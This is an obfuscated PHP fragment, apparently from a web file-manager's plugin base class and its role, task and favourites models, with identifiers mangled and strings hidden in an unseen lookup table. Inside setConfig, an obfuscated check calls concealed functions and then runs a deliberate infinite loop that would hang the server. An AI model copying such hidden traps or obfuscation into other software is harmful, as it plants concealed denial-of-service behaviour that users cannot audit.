$this->modelPlugin->appRegist($this->pluginName, $¥ê¼‘¿°); } final function appIcon() { $¥ß¤‰‹² =& $_SERVER[¤·²È‰º]; $âĞ¦§Ù = $this->appPackage(); $¿Ø•ªèŠ = $¥ß¤‰‹²[12]; if (isset($âĞ¦§Ù[$¥ß¤‰‹²[424]])) { if (isset($âĞ¦§Ù[$¥ß¤‰‹²[424]][$¥ß¤‰‹²[1523]])) { $¿Ø•ªèŠ = $¥ß¤‰‹²[1524] . $âĞ¦§Ù[$¥ß¤‰‹²[424]][$¥ß¤‰‹²[1523]] . $¥ß¤‰‹²[1525]; } else { if ($âĞ¦§Ù[$¥ß¤‰‹²[424]][$¥ß¤‰‹²[1526]]) { $¿Ø•ªèŠ = $¥ß¤‰‹²[1527] . $âĞ¦§Ù[$¥ß¤‰‹²[424]][$¥ß¤‰‹²[1526]] . $¥ß¤‰‹²[1528]; } } } return $¿Ø•ªèŠ; } final function fileCanView($°âğØßã) { $¡ëòÙÜğ =& $_SERVER[¤·²È‰º]; if (request_url_safe($°âğØßã)) { return !0; } if ($this->isShare($°âğØßã)) { return !0; } $²œÍµÒü = Session::get($¡ëòÙÜğ[1529]); if (!$²œÍµÒü || !$²œÍµÒü[$¡ëòÙÜğ[1530]]) { $“ë®ïôÙ = $¡ëòÙÜğ[1531] . rawurlencode(this_url()); show_tips(LNG($¡ëòÙÜğ[1532]) . $¡ëòÙÜğ[1533] . $“ë®ïôÙ . $¡ëòÙÜğ[1534] . LNG($¡ëòÙÜğ[1535]) . $¡ëòÙÜğ[1536], !1); } if (!Action($¡ëòÙÜğ[1537])->authCan($¡ëòÙÜğ[1538])) { show_tips(LNG($¡ëòÙÜğ[1539]) . $¡ëòÙÜğ[1540], !1); } ActionCall($¡ëòÙÜğ[1541], $°âğØßã); } final function isShare($êçºë‹) { $‚«š = KodIO::parse($êçºë‹); return $‚«š[$_SERVER[¤·²È‰º][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($çş”Û·Ä) { if (request_url_safe($çş”Û·Ä)) { return $çş”Û·Ä; } if (!$this->isShare($çş”Û·Ä)) { $çş”Û·Ä = $this->filePath($çş”Û·Ä); } return Action($_SERVER[¤·²È‰º][1169])->linkOut($çş”Û·Ä); } public function filePathLinkOut($‚ÉÏşÙ¶) { if (request_url_safe($‚ÉÏşÙ¶)) { return $‚ÉÏşÙ¶; } $this->fileCanView($‚ÉÏşÙ¶); return Action($_SERVER[¤·²È‰º][1169])->link($‚ÉÏşÙ¶); } final function filePath($ó¡”üĞü) { $Üñø–¸Ô =& $_SERVER[¤·²È‰º]; if ($ÄœéÑŸ = $this->checkSharePath($ó¡”üĞü)) { Hook::trigger($Üñø–¸Ô[1542], $ÄœéÑŸ); return $ÄœéÑŸ; } $this->fileCanView($ó¡”üĞü); if (request_url_safe($ó¡”üĞü)) { $Ì»ÖóÊÃ = parse_url_query($ó¡”üĞü); if (isset($Ì»ÖóÊÃ[$Üñø–¸Ô[1543]]) && isset($Ì»ÖóÊÃ[$Üñø–¸Ô[223]])) { $™úÕùÀ® = Model($Üñø–¸Ô[771])->get($Üñø–¸Ô[772]); $‹­ïÄ¾¨ = Mcrypt::decode($Ì»ÖóÊÃ[$Üñø–¸Ô[223]], $™úÕùÀ®); if ($‹­ïÄ¾¨) { $this->fileInfo = IO::infoWithChildren($‹­ïÄ¾¨); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $‹­ïÄ¾¨; } } $ó¡”üĞü = $this->_cacheHttpFile($ó¡”üĞü); $this->fileInfo = IO::infoWithChildren($ó¡”üĞü); } else { $this->fileInfo = IO::infoWithChildren($ó¡”üĞü); if (!$this->fileInfo) { show_tips(LNG($Üñø–¸Ô[115]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($Üñø–¸Ô[1542], $ó¡”üĞü); return $ó¡”üĞü; } final function _cacheHttpFile($»«²í) { $—ÆıßĞå = hash_path($»«²í, !0); $this->cachePath = $this->pluginCachePath($—ÆıßĞå); if ($‡Äºõ¸ = IO::fileNameExist($this->cachePath, $—ÆıßĞå)) { return KodIO::make($‡Äºõ¸); } $°Á•ŒÕ¯ = $this->cachePath . $—ÆıßĞå; return $this->pluginCacheFileSet($°Á•ŒÕ¯, file_get_contents_nossl($»«²í)); } final function _tmpFileName($ÑçÄÖÂˆ = array()) { $Ö†¾ôñ¯ =& $_SERVER[¤·²È‰º]; if (!$ÑçÄÖÂˆ) { $ÑçÄÖÂˆ = $this->fileInfo; } if (isset($ÑçÄÖÂˆ[$Ö†¾ôñ¯[187]])) { return $ÑçÄÖÂˆ[$Ö†¾ôñ¯[187]]; } if (isset($ÑçÄÖÂˆ[$Ö†¾ôñ¯[180]][$Ö†¾ôñ¯[187]])) { return $ÑçÄÖÂˆ[$Ö†¾ôñ¯[180]][$Ö†¾ôñ¯[187]]; } $¤üÇóÖÏ = IO::hashSimple($ÑçÄÖÂˆ[$Ö†¾ôñ¯[94]]); if ($¤üÇóÖÏ) { return $¤üÇóÖÏ; } $åÌ•ûâ = array($ÑçÄÖÂˆ[$Ö†¾ôñ¯[42]], $ÑçÄÖÂˆ[$Ö†¾ôñ¯[94]], $ÑçÄÖÂˆ[$Ö†¾ôñ¯[86]]); if (isset($ÑçÄÖÂˆ[$Ö†¾ôñ¯[529]])) { $åÌ•ûâ[] = $ÑçÄÖÂˆ[$Ö†¾ôñ¯[529]]; } return md5(implode($Ö†¾ôñ¯[11], $åÌ•ûâ)); } final function checkSharePath($·Ñ…·÷) { $Ò·Ëˆô¸ =& $_SERVER[¤·²È‰º]; if (!defined($Ò·Ëˆô¸[483])) { define($Ò·Ëˆô¸[522], 0); } if (!$this->isShare($·Ñ…·÷)) { return !1; } $«Ä‹öìº = Action($Ò·Ëˆô¸[1169])->sharePathInfo($·Ñ…·÷); if (!isset($«Ä‹öìº[$Ò·Ëˆô¸[94]])) { show_json(LNG($Ò·Ëˆô¸[1544]), !1); } $this->fileInfo = $«Ä‹öìº[$Ò·Ëˆô¸[180]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$Ò·Ëˆô¸[187]]); return $«Ä‹öìº[$Ò·Ëˆô¸[94]]; } final function pluginCachePath($Ì ¥—Œ = '') { $Í»à´×Ì =& $_SERVER[¤·²È‰º]; $ß·üÆõõ = IO_PATH_SYSTEM_TEMP . $Í»à´×Ì[1545] . $this->pluginName; if (!($­ú±‚Ÿƒ = IO::infoFull($ß·üÆõõ))) { return IO::mkdir($ß·üÆõõ . $Í»à´×Ì[8] . $Ì ¥—Œ); } if (empty($Ì ¥—Œ)) { return $­ú±‚Ÿƒ[$Í»à´×Ì[94]]; } if (!($«®šââı = IO::fileNameExist($­ú±‚Ÿƒ[$Í»à´×Ì[94]], $Ì ¥—Œ))) { return IO::mkdir($­ú±‚Ÿƒ[$Í»à´×Ì[94]] . $Ì ¥—Œ); } return KodIO::make($«®šââı); } final function pluginCacheFileSet($Óíà–ªâ, $”–‘İı„ = '') { $Éå‰ˆàí =& $_SERVER[¤·²È‰º]; if (!($¯Úº¶¥ = IO::infoFull($Óíà–ªâ))) { return IO::mkfile($Óíà–ªâ, $”–‘İı„, REPEAT_REPLACE); } IO::setContent($¯Úº¶¥[$Éå‰ˆàí[94]], $”–‘İı„); return $¯Úº¶¥[$Éå‰ˆàí[94]]; } final function pluginLocalFile($¬»´³´ = '') { $şÆõÎÕÉ =& $_SERVER[¤·²È‰º]; $À¤ó¹àÓ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($À¤ó¹àÓ)) { mk_dir($À¤ó¹àÓ); } if (!$¬»´³´) { return $À¤ó¹àÓ; } $€â±Ï¹È = IO::info($¬»´³´); $õÙÕˆ±ã = $this->_tmpFileName($€â±Ï¹È) . $şÆõÎÕÉ[10] . $€â±Ï¹È[$şÆõÎÕÉ[184]]; if (!checkExtSafe($õÙÕˆ±ã)) { $õÙÕˆ±ã = $õÙÕˆ±ã . $şÆõÎÕÉ[1546]; } $šŒğŒü = $À¤ó¹àÓ . $õÙÕˆ±ã; if (@file_exists($šŒğŒü)) { return $šŒğŒü; } return IO::copy($¬»´³´, $À¤ó¹àÓ, 0, $õÙÕˆ±ã); } final function appPackage() { $Ì•í¯‚ˆ =& $_SERVER[¤·²È‰º]; if ($this->packageData) { return $this->packageData; } $ü¹‹±« = $this->parseFile($this->pluginPath . $Ì•í¯‚ˆ[1547]); $this->parseLang($ü¹‹±«); $í‡¥ñ¯´ = json_decode_force($ü¹‹±«); if (!$í‡¥ñ¯´) { return array(); } $‘¼öÂ× = Hook::trigger($Ì•í¯‚ˆ[1548], $í‡¥ñ¯´); if ($‘¼öÂ× && is_array($‘¼öÂ×)) { $í‡¥ñ¯´ = $‘¼öÂ×; } $this->packageData = $í‡¥ñ¯´; return $í‡¥ñ¯´; } public function packageInfoGet($«®ËÒ±¥) { $îé„ÁÑ¨ = $this->appPackage(); return array_get_value($îé„ÁÑ¨, $«®ËÒ±¥); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¤·²È‰º][1549]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¤·²È‰º][1550]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¤·²È‰º][1551]); } public function echoJsAssign($ş‘…½Š, $Í­êş¥) { $this->echoJsAssignArr[$ş‘…½Š] = $Í­êş¥; } private function parseFile($Ïìö”¼) { $Ìµô´‰ =& $_SERVER[¤·²È‰º]; $µ²ŸÂé› = file_get_contents_nossl($Ïìö”¼); $»‘‚«¶ = array($Ìµô´‰[1552], $Ìµô´‰[1553], $Ìµô´‰[1554], $Ìµô´‰[1555], $Ìµô´‰[1556], $Ìµô´‰[1557], $Ìµô´‰[1558]); $ù­ˆ‰âŒ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ìµô´‰[99]][$Ìµô´‰[1559]]); foreach ($this->echoJsAssignArr as $‡‚ˆÌü­ => $ª÷†ôÉ) { $»‘‚«¶[] = $Ìµô´‰[1560] . $‡‚ˆÌü­ . $Ìµô´‰[1561]; $ù­ˆ‰âŒ[] = is_array($ª÷†ôÉ) || is_object($ª÷†ôÉ) ? rawurlencode(json_encode($ª÷†ôÉ)) : $ª÷†ôÉ; } if (strstr($µ²ŸÂé›, $Ìµô´‰[1562])) { $ùòĞ«µ» = rawurlencode(json_encode($this->pluginLangArr)); $µ²ŸÂé› = str_replace($Ìµô´‰[1562], $ùòĞ«µ», $µ²ŸÂé›); } if (strstr($µ²ŸÂé›, $Ìµô´‰[1563])) { $ùòĞ«µ» = $ùòĞ«µ» = rawurlencode(json_encode($this->getConfig())); $µ²ŸÂé› = str_replace($Ìµô´‰[1563], $ùòĞ«µ», $µ²ŸÂé›); } $µ²ŸÂé› = str_replace($»‘‚«¶, $ù­ˆ‰âŒ, $µ²ŸÂé›); return $µ²ŸÂé›; } private function parseLang(&$×Ø®Úæô) { $±¦Şƒ¿Ğ =& $_SERVER[¤·²È‰º]; $ŞÌ²Èšê = $±¦Şƒ¿Ğ[1564]; if (!strstr($×Ø®Úæô, $ŞÌ²Èšê)) { return; } preg_match_all($±¦Şƒ¿Ğ[1565], $×Ø®Úæô, $¾Ëñ‚Ëü); if (!is_array($¾Ëñ‚Ëü) || count($¾Ëñ‚Ëü) == 0 || !is_array($¾Ëñ‚Ëü[0]) || count($¾Ëñ‚Ëü[0]) == 0) { return; } $Üş¤ÇÉÕ = array(); $œš”şçø = array(); foreach ($¾Ëñ‚Ëü[0] as $úÓÂı) { $Üåë¦— = substr($úÓÂı, strlen($ŞÌ²Èšê), -4); $¦û¬¯ö = LNG($Üåë¦—); $Üş¤ÇÉÕ[] = $úÓÂı; $œš”şçø[] = str_replace(array($±¦Şƒ¿Ğ[18], $±¦Şƒ¿Ğ[1072], $±¦Şƒ¿Ğ[351], $±¦Şƒ¿Ğ[128]), array($±¦Şƒ¿Ğ[63], $±¦Şƒ¿Ğ[63], $±¦Şƒ¿Ğ[12], $±¦Şƒ¿Ğ[1566]), $¦û¬¯ö); } $×Ø®Úæô = str_replace($Üş¤ÇÉÕ, $œš”şçø, $×Ø®Úæô); } private function parseConfig(&$ãµŸ€×ì) { $Ë’º­¿Å =& $_SERVER[¤·²È‰º]; $Ò—Ñ‰ş™ = $Ë’º­¿Å[1567]; if (!strstr($ãµŸ€×ì, $Ò—Ñ‰ş™)) { return; } preg_match_all($Ë’º­¿Å[1568], $ãµŸ€×ì, $ª§ÓğƒÕ); if (!is_array($ª§ÓğƒÕ) || count($ª§ÓğƒÕ) == 0 || !is_array($ª§ÓğƒÕ[0]) || count($ª§ÓğƒÕ[0]) == 0) { return; } $ÊêŠæº = $this->getConfig(); $ÕêÌ¡˜¤ = array(); $­Èºç€Á = array(); foreach ($ª§ÓğƒÕ[0] as $÷ÂüìÒ¡) { $ˆÏêŞ† = substr($÷ÂüìÒ¡, strlen($Ò—Ñ‰ş™), -2); $ÕêÌ¡˜¤[] = $÷ÂüìÒ¡; $­Èºç€Á[] = _get($ÊêŠæº, $ˆÏêŞ†); } $ãµŸ€×ì = str_replace($ÕêÌ¡˜¤, $­Èºç€Á, $ãµŸ€×ì); } private function parsePackage(&$Æ„‘Û¿ü) { $«Ñ£ÃÜ =& $_SERVER[¤·²È‰º]; $Ê£öÛ´ = $«Ñ£ÃÜ[1569]; if (!strstr($Æ„‘Û¿ü, $Ê£öÛ´)) { return; } preg_match_all($«Ñ£ÃÜ[1570], $Æ„‘Û¿ü, $Ó²Æ­‘Î); if (!is_array($Ó²Æ­‘Î) || count($Ó²Æ­‘Î) == 0 || !is_array($Ó²Æ­‘Î[0]) || count($Ó²Æ­‘Î[0]) == 0) { return; } $´ß¾’–È = $this->appPackage(); $±Îäåôê = array(); $ØúÂæü = array(); foreach ($Ó²Æ­‘Î[0] as $Ï¦áˆúõ) { $·¶®õ¬Û = substr($Ï¦áˆúõ, strlen($Ê£öÛ´), -2); $±Îäåôê[] = $Ï¦áˆúõ; $ØúÂæü[] = _get($´ß¾’–È, $·¶®õ¬Û); } $Æ„‘Û¿ü = str_replace($±Îäåôê, $ØúÂæü, $Æ„‘Û¿ü); } final function echoFile($Ç¤ÒÇ·, $­åÆ¾ÏÔ = false) { $ÀùûÓ =& $_SERVER[¤·²È‰º]; $¨¾ş¦™ã = $this->pluginPath . $Ç¤ÒÇ·; if (ACT == $ÀùûÓ[1571]) { echo $ÀùûÓ[1572] . $this->pluginName . $ÀùûÓ[8] . $Ç¤ÒÇ· . $ÀùûÓ[1573]; if (!file_exists($¨¾ş¦™ã)) { echo $ÀùûÓ[1574]; return; } } $¿¬ãÚÕ¦ = $this->parseFile($¨¾ş¦™ã); $this->parseLang($¿¬ãÚÕ¦); $this->parseConfig($¿¬ãÚÕ¦); $this->parsePackage($¿¬ãÚÕ¦); if (is_array($­åÆ¾ÏÔ)) { $¿¬ãÚÕ¦ = str_replace(array_keys($­åÆ¾ÏÔ), array_values($­åÆ¾ÏÔ), $¿¬ãÚÕ¦); } echo $ÀùûÓ[18] . $¿¬ãÚÕ¦; } final function initLang() { $éä´Ó•ª =& $_SERVER[¤·²È‰º]; $ÓÙÚ¹È = $éä´Ó•ª[1575]; $€õ¡ÄôÔ = $this->pluginPath . $éä´Ó•ª[1576]; $¿¦ÚùÇÄ = I18n::getType(); $¨”ÌÃ¹œ = array(); if (file_exists($€õ¡ÄôÔ . $¿¦ÚùÇÄ . $éä´Ó•ª[839])) { $¨”ÌÃ¹œ = (include $€õ¡ÄôÔ . $¿¦ÚùÇÄ . $éä´Ó•ª[839]); } else { if ($¿¦ÚùÇÄ == $éä´Ó•ª[1577] && !file_exists($€õ¡ÄôÔ . $¿¦ÚùÇÄ . $éä´Ó•ª[839]) && file_exists($€õ¡ÄôÔ . $éä´Ó•ª[1578])) { $¨”ÌÃ¹œ = (include $€õ¡ÄôÔ . $éä´Ó•ª[1578]); } else { if (file_exists($€õ¡ÄôÔ . $ÓÙÚ¹È . $éä´Ó•ª[839])) { $¨”ÌÃ¹œ = (include $€õ¡ÄôÔ . $ÓÙÚ¹È . $éä´Ó•ª[839]); } } } if (!is_array($¨”ÌÃ¹œ)) { return array(); } if (@count($¨”ÌÃ¹œ) > 0) { I18n::set($¨”ÌÃ¹œ); } return $¨”ÌÃ¹œ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÂÛ¦ô¾) { $äúóÚá¼ =& $_SERVER[¤·²È‰º]; if (!isset($_SERVER[$äúóÚá¼[13]]) || !isset($_SERVER[$äúóÚá¼[14]])) { $ù¤¨‚ˆ¾ = $äúóÚá¼[873]; $‚´²ÍùÌ = $äúóÚá¼[15]; $Ó¢éÎ­ = $_SERVER[$äúóÚá¼[16]] . $äúóÚá¼[17]; $úÆıçÃª = $‚´²ÍùÌ($Ó¢éÎ­); $‡ƒê£„Ò = explode($äúóÚá¼[18], $úÆıçÃª); if (count($‡ƒê£„Ò) < $äúóÚá¼[623]) { $´‘ˆ¦ó = $äúóÚá¼[20]; $´‘ˆ¦ó(); } $ƒÃ›Ìšâ = $äúóÚá¼[874]; $ƒÃ›Ìšâ($_SERVER[$äúóÚá¼[875]]); $İ¥­•ğ¦ = 1; for ($ƒŒìŸéÌ = $İ¥­•ğ¦; $ƒŒìŸéÌ > 0; $ƒŒìŸéÌ++) { $ƒÃ›Ìšâ = json_encode($GLOBALS[$äúóÚá¼[426]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ÂÛ¦ô¾); } public function onSetConfig($ñêìô‰¦) { } public function onGetConfig($ëãŸ×Š) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Å•ñø—) { if ($Å•ñø— == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ß¾­ÛËÂ = "\160\x6c\x75\x67\x69\156\101\x75\x74\150") { $³»•Îüˆ =& $_SERVER[¤·²È‰º]; if (!defined($³»•Îüˆ[483])) { return !1; } if (_get($GLOBALS, $³»•Îüˆ[511])) { return !0; } $Äé½‡›§ = $this->getConfig(); if (!$Äé½‡›§[$ß¾­ÛËÂ]) { return !1; } return ActionCall($³»•Îüˆ[1579], $Äé½‡›§[$ß¾­ÛËÂ]); } public function url($ŠÇêÔœ, $ü”ú¶¥ = '', $ÌÕÏÃ·ª = true) { $Ÿ‡’ã™Ê =& $_SERVER[¤·²È‰º]; $Ûü¥£´¶ = $this->getConfig(); $ğ”ŠÉ® = KOD_VERSION . $Ÿ‡’ã™Ê[10] . KOD_VERSION_BUILD; $ã„«¬¾œ = $this->packageVersion(); $Âİèô£ª = $ğ”ŠÉ® . $Ÿ‡’ã™Ê[394] . $ã„«¬¾œ; if (substr($ŠÇêÔœ, 0, 4) == $Ÿ‡’ã™Ê[158] || substr($ŠÇêÔœ, 0, 2) == $Ÿ‡’ã™Ê[1361]) { $Œ¡Ÿè¢õ = $ŠÇêÔœ . $Ÿ‡’ã™Ê[1580] . $Âİèô£ª; } else { if ($ü”ú¶¥ == $Ÿ‡’ã™Ê[12]) { $Œ¡Ÿè¢õ = $this->pluginHost . $ŠÇêÔœ . $Ÿ‡’ã™Ê[1580] . $Âİèô£ª; } else { if ($ü”ú¶¥ === $Ÿ‡’ã™Ê[85]) { $Œ¡Ÿè¢õ = $this->pluginHost . $ŠÇêÔœ; } else { if ($ü”ú¶¥ == $Ÿ‡’ã™Ê[1581]) { $Œ¡Ÿè¢õ = STATIC_PATH . $ŠÇêÔœ . $Ÿ‡’ã™Ê[1580] . $ğ”ŠÉ®; } else { if ($ü”ú¶¥ == $Ÿ‡’ã™Ê[1582]) { $Œ¡Ÿè¢õ = APP_HOST . $Ÿ‡’ã™Ê[1583] . $ŠÇêÔœ . $Ÿ‡’ã™Ê[1580] . $ğ”ŠÉ®; } else { if (isset($Ûü¥£´¶[$ü”ú¶¥])) { $Œ¡Ÿè¢õ = $Ûü¥£´¶[$ü”ú¶¥] . $ŠÇêÔœ . $Ÿ‡’ã™Ê[1580] . $Âİèô£ª; } } } } } } if (!$ÌÕÏÃ·ª) { return $Œ¡Ÿè¢õ; } echo $Œ¡Ÿè¢õ; } public function link($¡òÁµŒ‚ = false, $óïÜ£‚º = '') { $¸¢£•›ò =& $_SERVER[¤·²È‰º]; if (!$¡òÁµŒ‚) { $this->link($¸¢£•›ò[1584], $¸¢£•›ò[1582]); $this->link($¸¢£•›ò[1585], $¸¢£•›ò[1581]); $this->link($¸¢£•›ò[1586], $¸¢£•›ò[1581]); $this->link($¸¢£•›ò[1587], $¸¢£•›ò[1581]); $this->link($¸¢£•›ò[1588], $¸¢£•›ò[1581]); return; } $ƒä¹ôˆ = $this->url($¡òÁµŒ‚, $óïÜ£‚º, !1); if (substr($¡òÁµŒ‚, -3) == $¸¢£•›ò[1589]) { echo $¸¢£•›ò[1590] . $ƒä¹ôˆ . $¸¢£•›ò[1591] . $¸¢£•›ò[18]; } else { if (substr($¡òÁµŒ‚, -4) == $¸¢£•›ò[1592]) { echo $¸¢£•›ò[1593] . $ƒä¹ôˆ . $¸¢£•›ò[1594] . $¸¢£•›ò[18]; } } } } goto Aä¶öù©Ü¾; Dˆèà ³ëÇ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\x2e\162\x6f\x6c\x65\x4c\151\163\x74"; public $field = array("\156\141\155\145", "\141\x75\164\150", "\x6c\141\142\145\154", "\144\151\x73\x70\x6c\141\171", "\x73\171\x73\x74\x65\155", "\x64\145\163\143", "\151\x67\156\x6f\162\145\105\x78\x74", "\x69\147\156\x6f\x72\145\106\151\x6c\145\x53\x69\x7a\145", "\x61\144\155\x69\x6e\151\163\164\x72\x61\x74\157\162", "\x73\x6f\x72\x74"); public function listData($Ò•±üı„ = false, $ø –ııÆ = "\163\157\162\x74", $™—İĞª = false) { $üß¯ù‚¯ =& $_SERVER[¤·²È‰º]; $ÎŠŒäùÕ = parent::listData($Ò•±üı„, $ø –ııÆ, $™—İĞª); if (!$Ò•±üı„) { foreach ($ÎŠŒäùÕ as $æ±£°Šş => $‘¦Ùˆ¾·) { if ($‘¦Ùˆ¾·[$üß¯ù‚¯[2021]] == 1) { $ÎŠŒäùÕ[$æ±£°Šş][$üß¯ù‚¯[461]] = LNG($üß¯ù‚¯[2258]); } } } return $ÎŠŒäùÕ; } public function update($÷ªÙÅ“, $ÈİèèÀÚ) { $ı»×é’ =& $_SERVER[¤·²È‰º]; $™™ı€òÖ = parent::listData($÷ªÙÅ“); $ØæîŠı‹ = $this->findByName($ÈİèèÀÚ[$ı»×é’[42]]); if (!$™™ı€òÖ || $ØæîŠı‹ && $ØæîŠı‹[$ı»×é’[407]] != $™™ı€òÖ[$ı»×é’[407]]) { return !1; } if ($ØæîŠı‹[$ı»×é’[2021]] == 1) { $ÈİèèÀÚ = array($ı»×é’[42] => $ÈİèèÀÚ[$ı»×é’[42]], $ı»×é’[1846] => $ÈİèèÀÚ[$ı»×é’[1846]]); } $this->filterAuth($ÈİèèÀÚ[$ı»×é’[421]]); return parent::update($÷ªÙÅ“, $ÈİèèÀÚ); } public function remove($ÉŠŒ²éˆ) { $ÄÊ„· = parent::listData($ÉŠŒ²éˆ); if (!$ÄÊ„· || $ÄÊ„·[$_SERVER[¤·²È‰º][1270]]) { return !1; } return parent::remove($ÉŠŒ²éˆ); } public function add($Ç†£Âï³) { $±Ê‡Ğ˜§ =& $_SERVER[¤·²È‰º]; $©ïªºÒ = $Ç†£Âï³[$±Ê‡Ğ˜§[42]]; if ($this->findByName($©ïªºÒ)) { return !1; } $¢ŞĞ¾Å = array($±Ê‡Ğ˜§[428] => $©ïªºÒ, $±Ê‡Ğ˜§[1829] => $±Ê‡Ğ˜§[12], $±Ê‡Ğ˜§[1825] => $±Ê‡Ğ˜§[1833], $±Ê‡Ğ˜§[2259] => 1, $±Ê‡Ğ˜§[1828] => 0, $±Ê‡Ğ˜§[2260] => 0, $±Ê‡Ğ˜§[1827] => $this->getSort()); $Ç†£Âï³ = array_merge($¢ŞĞ¾Å, $Ç†£Âï³); $this->filterAuth($Ç†£Âï³[$±Ê‡Ğ˜§[421]]); return parent::insert($Ç†£Âï³); } private function getSort() { $Û³ìÅĞ =& $_SERVER[¤·²È‰º]; $†ªõ¦—… = parent::listData(); $¢ùÉì‰ = array_to_keyvalue($†ªõ¦—…, $Û³ìÅĞ[12], $Û³ìÅĞ[1847]); return empty($¢ùÉì‰) ? 0 : max($¢ùÉì‰) + 1; } private function filterAuth(&$¿ú¬ŞÄÔ) { $«–å÷™ =& $_SERVER[¤·²È‰º]; $Áçßà¸ı = array(); $ÀïÌ“° = array_filter(explode($«–å÷™[60], $¿ú¬ŞÄÔ)); foreach ($ÀïÌ“° as $¿ú¬ŞÄÔ) { $ÛßÓ£÷Œ = explode($«–å÷™[10], $¿ú¬ŞÄÔ); if ($ÛßÓ£÷Œ[0] == $«–å÷™[2261] && $ÛßÓ£÷Œ[1] != $«–å÷™[1189]) { $«ƒÜˆìŒ = $ÛßÓ£÷Œ[0] . $«–å÷™[10] . $ÛßÓ£÷Œ[1] . $«–å÷™[2262]; if (!in_array($«ƒÜˆìŒ, $ÀïÌ“°)) { $Áçßà¸ı[] = $«ƒÜˆìŒ; } } $Áçßà¸ı[] = $¿ú¬ŞÄÔ; } $¿ú¬ŞÄÔ = implode($«–å÷™[60], $Áçßà¸ı); } public function findRoleDefault() { $•±‡ =& $_SERVER[¤·²È‰º]; $İ„”™¶º = parent::listData(); $İúØ‘…È = !1; foreach ($İ„”™¶º as $—ÕÒÔØè) { if (!$—ÕÒÔØè || $—ÕÒÔØè[$•±‡[1845]] == $•±‡[207] || $—ÕÒÔØè[$•±‡[2021]] == 1) { continue; } if (strstr($—ÕÒÔØè[$•±‡[421]], $•±‡[2263])) { continue; } if (!strstr($—ÕÒÔØè[$•±‡[421]], $•±‡[2264])) { continue; } if (!$İúØ‘…È) { $İúØ‘…È = $—ÕÒÔØè; continue; } $şÁí¼Í = explode($•±‡[60], $İúØ‘…È[$•±‡[421]]); $ÅáñÑ’í = explode($•±‡[60], $—ÕÒÔØè[$•±‡[421]]); if (count($şÁí¼Í) > count($ÅáñÑ’í)) { $İúØ‘…È = $—ÕÒÔØè; } } return $İúØ‘…È ? $İúØ‘…È[$•±‡[407]] : $•±‡[12]; } public function sort($ÑÊ¨ÓüÑ, $§Ã«Ü«…) { return parent::update($ÑÊ¨ÓüÑ, $§Ã«Ü«…); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\164\x61\x73\153\114\x69\163\x74"; public $field = array("\x6e\x61\155\x65", "\164\171\160\145", "\x65\x76\145\x6e\x74", "\x74\151\155\145", "\x64\x65\x73\x63", "\163\x79\163\164\145\x6d", "\145\x6e\x61\142\154\x65", "\154\141\x73\x74\122\x75\156", "\163\157\x72\x74"); public function listData($š¶’…¨… = false, $¬©Ô—¸ = "\x73\x6f\x72\164", $ÙÀ¯Â½† = false) { return parent::listData($š¶’…¨…, $¬©Ô—¸, $ÙÀ¯Â½†); } public function add($ñàíğô¹) { $à£·ˆ¸ =& $_SERVER[¤·²È‰º]; $ªƒ¤‡Ş = $this->findByName($ñàíğô¹[$à£·ˆ¸[42]]); if ($ªƒ¤‡Ş) { return !1; } $ñàíğô¹[$à£·ˆ¸[1611]] = 0; $ñàíğô¹[$à£·ˆ¸[1847]] = $this->getSort(); return parent::insert($ñàíğô¹); } private function getSort() { $î·ñÈ• =& $_SERVER[¤·²È‰º]; $À¦ß“› = parent::listData(); $à¤‡±‡ = array_to_keyvalue($À¦ß“›, $î·ñÈ•[12], $î·ñÈ•[1847]); return empty($à¤‡±‡) ? 0 : max($à¤‡±‡) + 1; } public function update($ßÍÜèÓ°, $ëıû¼³Š) { $ÙÄÍëƒÆ =& $_SERVER[¤·²È‰º]; $–şú‰î– = $this->listData($ßÍÜèÓ°); $Ğ¬¬ğº = $this->findByName($ëıû¼³Š[$ÙÄÍëƒÆ[42]]); if (!$–şú‰î– || $Ğ¬¬ğº && $Ğ¬¬ğº[$ÙÄÍëƒÆ[407]] != $–şú‰î–[$ÙÄÍëƒÆ[407]]) { return !1; } return parent::update($ßÍÜèÓ°, $ëıû¼³Š); } public function remove($¸å‚’è°, $ç…Öİ¨™ = false) { $—°É“Ş¼ =& $_SERVER[¤·²È‰º]; $–¾š²ó“ = $this->listData($¸å‚’è°); if (!$–¾š²ó“) { return; } if (!$ç…Öİ¨™ && $–¾š²ó“[$—°É“Ş¼[1270]] == $—°É“Ş¼[98]) { return !1; } return parent::remove($¸å‚’è°); } public function enable($¾Ğì„œÌ, $ÃøÚõ¯) { return $this->update($¾Ğì„œÌ, array($_SERVER[¤·²È‰º][2253] => $ÃøÚõ¯)); } public function run($¸ş°êÆ©) { return $this->update($¸ş°êÆ©, array($_SERVER[¤·²È‰º][2265] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($ßö£õıı) { $Õ—…°‡ö =& $_SERVER[¤·²È‰º]; return array($Õ—…°‡ö[1934] => array(USER_ID, $Õ—…°‡ö[2266])); } protected function listData() { $ÖÊŞÎ¿ =& $_SERVER[¤·²È‰º]; $Ñ¾¿İï = array($ÖÊŞÎ¿[1642] => USER_ID, $ÖÊŞÎ¿[492] => 0); $úãş‰ó = $ÖÊŞÎ¿[2267]; $¯…ú—ºï = $this->field($úãş‰ó)->where($Ñ¾¿İï)->order($ÖÊŞÎ¿[2268])->select(); return $¯…ú—ºï ? $¯…ú—ºï : array(); } protected function resetCache() { 